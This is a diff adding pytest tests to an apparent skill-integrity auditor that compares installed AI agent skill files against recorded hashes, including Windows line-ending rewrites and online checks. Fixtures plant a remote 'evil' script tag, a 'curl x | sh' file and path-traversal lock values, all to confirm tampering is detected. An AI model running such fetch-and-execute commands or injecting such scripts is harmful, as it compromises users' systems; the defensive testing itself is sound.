@@ -195,3 +195,47 @@ def test_install_with_crlf_files_is_intact(tmp_path):
     assert check(s, lock)["intact"]
     (d / "template.svg").write_bytes(b"<svg>\r\n<script/></svg>\r\n")
     assert not check(load_skill(d, "personal"), lock)["intact"]
+
+
+def _windows_checkout(tmp_path):
+    """Found on a real machine (cathrynlavery/diagram-design): upstream commits one file with CRLF, Git for
+    Windows converted every other text file to CRLF on checkout, and the installer wrote SKILL.md as LF."""
+    from skillaudit.provenance import _blob, tree_hash
+    upstream = {"SKILL.md": b"---\nname: diagrams\n---\n# Diagrams\n",
+                "assets/a.html": b"<p>\n</p>\n", "assets/b.html": b"<b>\r\n</b>\r\n"}
+    d = tmp_path / ".claude" / "skills" / "diagrams"
+    for rel, data in upstream.items():
+        (d / rel).parent.mkdir(parents=True, exist_ok=True)
+        (d / rel).write_bytes(data if rel == "SKILL.md" else data.replace(b"\r\n", b"\n").replace(b"\n", b"\r\n"))
+    tree = {rel: _blob(data).hex() for rel, data in upstream.items()}
+    lock = {"diagrams": {"source": "acme/diagrams", "skillFolderHash": tree_hash(upstream)}}
+    return d, tree, lock
+
+
+def test_rewritten_line_endings_are_unverified_offline_and_intact_online(tmp_path):
+    from skillaudit.provenance import check, verify_online
+    d, tree, lock = _windows_checkout(tmp_path)
+    rec = check(load_skill(d, "personal"), lock)
+    assert rec["status"] == "unverified"  # not "edited": offline hashes cannot decide
+    calls = []
+    online = verify_online(load_skill(d, "personal"), rec, fetch=lambda src, sha: calls.append((src, sha)) or tree)
+    assert calls == [("acme/diagrams", rec["recorded_hash"])]
+    assert online["status"] == "intact" and online["changed"] == [] and online["verified"] == "online"
+
+
+def test_online_check_names_the_edited_file(tmp_path):
+    from skillaudit.provenance import check, verify_online
+    d, tree, lock = _windows_checkout(tmp_path)
+    (d / "assets/a.html").write_bytes(b"<p>\r\n<script src=//evil></script></p>\r\n")
+    (d / "extra.sh").write_bytes(b"curl x | sh\r\n")
+    s = load_skill(d, "personal")
+    online = verify_online(s, check(s, lock), fetch=lambda src, sha: tree)
+    assert online["status"] == "edited"
+    assert online["changed"] == ["assets/a.html"] and online["added"] == ["extra.sh"] and online["removed"] == []
+
+
+def test_online_check_rejects_untrusted_lock_values(tmp_path):
+    from skillaudit.provenance import github_tree
+    for source, sha in [("acme/x?y=1", "a" * 40), ("../../etc", "a" * 40), ("acme/x", "main")]:
+        with pytest.raises(ValueError):
+            github_tree(source, sha)
